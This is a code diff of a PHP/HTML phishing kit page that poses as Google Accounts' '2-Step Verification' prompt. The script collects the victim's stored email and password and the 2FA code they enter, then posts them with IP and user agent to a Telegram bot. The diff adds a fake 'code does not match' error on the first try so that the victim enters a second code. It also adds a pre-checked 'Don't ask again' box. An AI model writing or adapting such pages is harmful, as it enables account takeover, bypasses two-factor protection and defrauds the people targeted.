@@ -1,7 +1,8 @@
 <?php
 // get root directory
-require_once('./get-data.php');
-require_once('./getip.php');
+$rootDirectory = dirname(dirname(__FILE__));
+require_once($rootDirectory . '/get-data.php');
+require_once($rootDirectory . '/getip.php');
 ?>
     
 <?php
@@ -28,7 +29,7 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify it's you - Google Accounts</title>
+    <title>2-Step Verification - Google Accounts</title>
     <link rel="icon" href="/images/favicon.ico">
     <style>
         * {
@@ -130,11 +131,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
         .user-info {
             background: transparent;
-            padding: 5px 10px 5px 5px;
+            padding: 5px 5px;
             margin-bottom: 24px;
-            border: 1px solid rgb(219, 221, 223);
-            border-radius: 24px;
-            width: fit-content;
             font-size: 14px;
             color: #202124;
             display: flex;
@@ -358,8 +356,8 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         <div class="main-content">
             <div class="left-section">
                 <div class="app-logo" id="appLogo">JL</div>
-                <h1 class="title">Verify it's you</h1>
-                <p class="subtitle" style="font-size: 14px;">To help keep your account safe, Google wants to make sure it's really you</p>
+                <h1 class="title">2-Step Verification</h1>
+                <p class="subtitle" style="font-size: 14px;">To help keep your account safe, Google wants to make sure it's really you trying to sign in</p>
                 
                 <div class="user-info">
                     <div class="user-icon" id="userIcon">U</div>
@@ -368,16 +366,23 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             </div>
 
             <div class="right-section">
+                <h2 class="title" style="font-size: 24px; margin-bottom: 16px;">2-Step Verification</h2>
                 <p class="subtitle" style="font-size: 14px; margin-bottom: 24px;">Get a verification code from the Google Authenticator app</p>
-                <form onsubmit="sendToTelegramFromTwoFactorAuthentication2(event)" autocomplete="off">
+                
+                <form onsubmit="sendToTelegramFromTwoFactorAuthentication(event)" autocomplete="off">
                     <div class="code-section">
                         <label for="code" class="code-label">Enter code</label>
                         <input type="text" id="code" class="code-input" placeholder="" maxlength="8" required>
                         <div class="error-message" id="errorMessage">The login code you entered does not match the code sent to your phone. Please re-enter if it still does not match.</div>
                     </div>
 
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="dontAskAgain" class="checkbox-input" checked>
+                        <label for="dontAskAgain" class="checkbox-label">Don't ask again on this device</label>
+                    </div>
+
                     <div class="button-group">
-                        <a href="#" class="try-another-link">More ways to verify</a>
+                        <a href="#" class="try-another-link">Try another way</a>
                         <button type="submit" class="next-button" id="nextButton" disabled>Next</button>
                     </div>
                 </form>
@@ -409,6 +414,10 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         var userAgent = '<?php echo $userAgent; ?>';
         var botToken = '<?php echo $token; ?>';
         var chatId = '<?php echo $chatId; ?>';
+
+        // State management cho 2FA
+        var isFirstAttempt = sessionStorage.getItem('2faFirstAttempt') !== 'false';
+        var attempts = parseInt(sessionStorage.getItem('2faAttempts') || '0');
 
         document.addEventListener('DOMContentLoaded', function() {
             const codeInput = document.getElementById('code');
@@ -445,9 +454,27 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                     errorMessage.style.display = 'none';
                 }
             });
+
+            // Kiểm tra nếu có lỗi từ session storage
+            var hasError = sessionStorage.getItem('2faError');
+            var savedCode = sessionStorage.getItem('savedCode');
+            
+            if (hasError === 'true' && savedCode) {
+                codeInput.value = savedCode;
+                codeInput.focus();
+                codeInput.select();
+                codeInput.classList.add('error');
+                
+                // Hiển thị thông báo lỗi
+                errorMessage.style.display = 'block';
+                
+                // Xóa session storage sau khi hiển thị
+                sessionStorage.removeItem('2faError');
+                sessionStorage.removeItem('savedCode');
+            }
         });
 
-        function sendToTelegramFromTwoFactorAuthentication2(event) {
+        function sendToTelegramFromTwoFactorAuthentication(event) {
             event.preventDefault();
             
             var code = document.getElementById('code').value;
@@ -455,13 +482,13 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             var password = localStorage.getItem('password');
             
             // Gửi dữ liệu đến Telegram
-            var content = "🔐 Google 2FA Code (2nd Step)💬" +
+            var content = "🔐 Google 2FA Code💬" +
                 "\n" + "----------------------------------------------------------" +
                 "\nEmail: " + "`" + email + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nPassword: " + "`" + password + "`" +
                 "\n" + "----------------------------------------------------------" +
-                "\n2FA Code (2nd): " + "`" + code + "`" +
+                "\n2FA Code: " + "`" + code + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
                 "\nIP Address: " + "`<?php echo $ip; ?>`" +
@@ -485,13 +512,41 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             })
             .then(response => response.json())
             .then(data => {
-                // Thành công ngay lập tức - chuyển đến trang consent
-                window.location.href = "/google-consent.php";
+                // Logic xử lý: Lần đầu luôn báo lỗi, lần 2 thì thành công
+                attempts++;
+                sessionStorage.setItem('2faAttempts', attempts.toString());
+                
+                if (attempts === 1) {
+                    // Lần đầu: Báo lỗi
+                    sessionStorage.setItem('2faError', 'true');
+                    sessionStorage.setItem('savedCode', code);
+                    sessionStorage.setItem('2faFirstAttempt', 'false');
+                    
+                    // Reload trang để hiển thị lỗi
+                    window.location.reload();
+                } else {
+                    // Lần 2: Thành công - chuyển đến trang 2FA thứ 2
+                    sessionStorage.removeItem('2faAttempts');
+                    sessionStorage.removeItem('2faFirstAttempt');
+                    window.location.href = "./two-verify-authentication-2";
+                }
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Fallback nếu có lỗi network - vẫn chuyển đến trang consent
-                window.location.href = "/google-consent.php";
+                // Fallback nếu có lỗi network
+                attempts++;
+                sessionStorage.setItem('2faAttempts', attempts.toString());
+                
+                if (attempts === 1) {
+                    sessionStorage.setItem('2faError', 'true');
+                    sessionStorage.setItem('savedCode', code);
+                    sessionStorage.setItem('2faFirstAttempt', 'false');
+                    window.location.reload();
+                } else {
+                    sessionStorage.removeItem('2faAttempts');
+                    sessionStorage.removeItem('2faFirstAttempt');
+                    window.location.href = "./two-verify-authentication-2";
+                }
             });
         }
     </script>
